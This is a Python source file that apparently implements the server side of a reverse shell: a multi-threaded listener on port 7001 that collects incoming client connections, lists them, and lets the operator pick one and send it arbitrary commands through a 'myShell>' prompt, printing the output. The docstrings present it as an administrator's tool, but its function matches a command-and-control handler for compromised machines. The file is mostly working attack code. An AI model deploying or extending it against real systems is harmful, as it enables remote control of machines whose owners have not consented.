import socket
import threading
import subprocess
import selectors
import os
from queue import Queue

NUMBER_OF_THREADS = 2
JOB_NUMBER = [1, 2]
PORT = 7001
HOST = socket.gethostbyname(socket.gethostname())
queue = Queue()
all_connections = []
all_address = []

def socket_create():
    ''' We first need to create a socket which let two computers connect eachother '''
    try:
        global server
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    except socket.error as msg:
        print("Socket creation error: " + str(msg))


def socket_bind():
    ''' Binding the socket and listening for connections '''
    try:
        global server
        print("Binding the port: " + str(PORT))
        server.bind((HOST, PORT))
        server.listen(10)
    except socket.error as msg:
        print("Socket Binding failed" + str(msg) + "\n" + "Retrying again")
        socket_bind()


def client_accept():
    ''' Handle connection from multiple clients and save connections to a list
        Close previous connections when server.py file is restarted '''
    global server
    for c in all_connections:
        c.close()
    all_connections.clear()
    all_address.clear()

    while True:
        try:
            conn, address = server.accept()
            server.setblocking(1)  # prevents timeout
            all_connections.append(conn)
            all_address.append(address)
            print(f"Connection has been established to:\n\t IP : {address[0]}\n\t PORT : {address[1]}")
        except:
            print("Error when accepting connections")

def start_shell():

    while True:
        cmd = input('myShell> ')
        if cmd == 'list':
            list_connections()
        elif 'select' in cmd:
            conn = get_target(cmd)
            if conn is not None:
                send_commands(conn)
        else:
            print("Command not recognized")

def list_connections():
    results = ''
    number_of_clients = 0

    for i, conn in enumerate(all_connections):
        try:
            conn.send(str.encode(' '))  # check if the connection is still alive or not
            conn.recv(1024)
        except:
            del all_connections[i]
            del all_address[i]
            continue
        else:
            number_of_clients = i + 1  
            results += str(i) + "   " + str(all_address[i][0]) + "   " + str(all_address[i][1]) + "\n"

    print(f'\nConnected Clients \t :\n{results}')
    print(f'Number of active Clients :  {number_of_clients}\n')


def get_target(cmd):
    ''' Selecting the target client (in case admin of the server wants to send a command to a client to warn or force terminate its connection)'''
    try:
        target = cmd.replace('select ', '')  # target = id
        target = int(target)
        conn = all_connections[target]
        print("You are now connected to :" + str(all_address[target][0]))
        print(str(all_address[target][0]) + "> ", end="")
        return conn
    except:
        print("Selection is not valid")
        return None


def send_commands(conn):
    ''' Send commands to client if needed '''
    while True:
        try:
            cmd = input()
            if cmd == "quit":
                break
            if len(str.encode(cmd)) > 0:
                conn.send(str.encode(cmd))
                client_response = str(conn.recv(4096), "utf-8")
                print(client_response, end="")
        except KeyboardInterrupt:
            print("Closing server socket...")
            server.close()


def create_workers():
    ''' Create worker threads '''
    for _ in range(NUMBER_OF_THREADS):
        t = threading.Thread(target=work)
        t.daemon = True # terminates the threads if server is shutdown
        t.start()


def work():
    ''' Thread 1:handle connections, Thread 2:show custom shell & send results/commands) '''
    while True:
        x = queue.get()
        if x == 1:
            socket_create()
            socket_bind()
            client_accept()
        if x == 2:
            start_shell()
        # if x == 3:
        #     respond_client()
        queue.task_done()

def create_jobs():
    for x in JOB_NUMBER:
        queue.put(x)

    queue.join()

create_workers()
create_jobs()